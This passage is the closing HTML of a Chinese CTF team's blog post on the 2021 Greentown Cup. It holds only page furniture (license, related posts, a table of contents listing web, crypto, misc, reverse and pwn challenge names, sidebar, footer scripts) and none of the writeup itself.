</div><div class="article-licensing box"><div class="licensing-title"><p>2021绿城杯wp</p><p><a href="https://wp.n03tack.top/posts/47585/">https://wp.n03tack.top/posts/47585/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="https://wp.n03tack.top"><p>n03tAck</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-09-30</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-09-30</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/posts/14620/" target="_blank">2021陇原战疫WP</a><br></span><span>  2.<a class="is-size-6" href="/posts/5066/" target="_blank">2021bytectf线上WP</a><br></span><span>  3.<a class="is-size-6" href="/posts/11556/" target="_blank">2021第一届长城杯网络安全大赛WP</a><br></span><span>  4.<a class="is-size-6" href="/posts/56002/" target="_blank">2021第五空间大赛WP</a><br></span><span>  5.<a class="is-size-6" href="/posts/1010/" target="_blank">2021网刃杯WP</a><br></span><span>  6.<a class="is-size-6" href="/posts/62454/" target="_blank">2021第二届祥云杯WP</a><br></span><span>  7.<a class="is-size-6" href="/posts/53053/" target="_blank">2021SSTF-Hacker&#039;s Playground!</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/7D1F151CCE01A9E6F955D3AD0195257F.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/5528B1622BD2CEB3A2EF095643DE9949.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/5066/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021bytectf线上WP</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/11556/"><span class="level-item">2021第一届长城杯网络安全大赛WP</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#成绩"><span>成绩</span></a></li><li><a class="is-flex is-mobile" href="#web"><span>web</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#ez-php"><span>ez_php</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Crypto"><span>Crypto</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#warmup-加密算法"><span>[warmup]加密算法</span></a></li><li><a class="is-flex is-mobile" href="#RSA-1"><span>RSA-1</span></a></li><li><a class="is-flex is-mobile" href="#RSA-2"><span>RSA-2</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Misc"><span>Misc</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#warmup-音频隐写"><span>[warmup]音频隐写</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#reverse"><span>reverse</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#hellowrold"><span>hellowrold</span></a></li><li><a class="is-flex is-mobile" href="#打卡"><span>打卡</span></a></li><li><a class="is-flex is-mobile" href="#easy-re"><span>easy_re</span></a></li><li><a class="is-flex is-mobile" href="#抛石机"><span>抛石机</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#pwn"><span>pwn</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#Null-pwn"><span>Null_pwn</span></a></li><li><a class="is-flex is-mobile" href="#ezuaf"><span>ezuaf</span></a></li><li><a class="is-flex is-mobile" href="#GreentownNote"><span>GreentownNote</span></a></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/logo.png" alt="n03tAck"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">n03tAck</p><p class="is-size-6 is-block">n03tAck战队writeup</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">1</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/dota-st" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/admin@wlhhlc.top"><i class="fa fa-envelope"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.wlhhlc.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">dota_st</span></span><span class="level-right"><span class="level-item tag">www.wlhhlc.top</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T01:41:17.000Z">2021-11-08</time></p><p class="title"><a href="/posts/14620/">2021陇原战疫WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-19T14:11:59.000Z">2021-10-19</time></p><p class="title"><a href="/posts/5066/">2021bytectf线上WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-30T04:23:00.000Z">2021-09-30</time></p><p class="title"><a href="/posts/47585/">2021绿城杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-19T15:05:06.000Z">2021-09-19</time></p><p class="title"><a href="/posts/11556/">2021第一届长城杯网络安全大赛WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-17T13:00:15.000Z">2021-09-17</time></p><p class="title"><a href="/posts/56002/">2021第五空间大赛WP</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/WP/"><span class="tag">WP</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a><p class="size-small"><span>&copy; 2021 n03tAck</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容创作权归属n03tAck战队所有]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2021/08/19 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(true){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script><script type="text/javascript">function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };loadMathJax();</script></body></html>